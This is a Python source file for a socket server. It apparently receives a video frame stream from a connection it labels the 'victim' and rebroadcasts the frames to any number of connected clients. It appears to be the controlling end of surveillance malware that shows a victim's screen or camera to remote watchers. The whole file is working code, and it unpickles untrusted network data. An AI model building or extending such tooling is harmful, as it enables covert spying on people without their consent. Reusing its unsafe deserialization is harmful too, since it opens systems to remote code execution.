import socket
import pickle
import struct
import threading
import time

frame = None
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
port = 9669
print("Client Serving Server")
print("Host IP:", host_ip)
server_socket.bind((host_ip, port))
server_socket.listen()
print("Listening at:", (host_ip, port), "\n\n")


def video_recv():
    global frame
    receive_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    port = 6969
    print("Victim Server: ")
    print("Host IP:", host_ip)
    receive_socket.bind((host_ip, port))
    receive_socket.listen(1)
    print("Listening at:", (host_ip, port), "\n\n")
    victim_socket, addr = receive_socket.accept()
    print(f"Victim Connected at {addr}")
    data = b""
    payload_size = struct.calcsize("Q")
    while True:
        while len(data) < payload_size:
            packet = victim_socket.recv(4*1024)
            if not packet:
                break
            data += packet
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        while len(data) < msg_size:
            data += victim_socket.recv(1024*1024)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)


threading.Thread(target=video_recv).start()


def serve_client(addr, client_socket):
    global frame
    try:
        print(f"Client {addr} Connected!")
        if client_socket:
            while True:
                a = pickle.dumps(frame)
                message = struct.pack("Q", len(a)) + a
                client_socket.sendall(message)
    except Exception as e:
        print(f"Client {addr} Disconnected!")


while True:
    client_socket, addr = server_socket.accept()
    print(addr)
    threading.Thread(target=serve_client, args=(addr, client_socket)).start()
    time.sleep(0.1)
    print("Total Clients:", threading.active_count()-2)
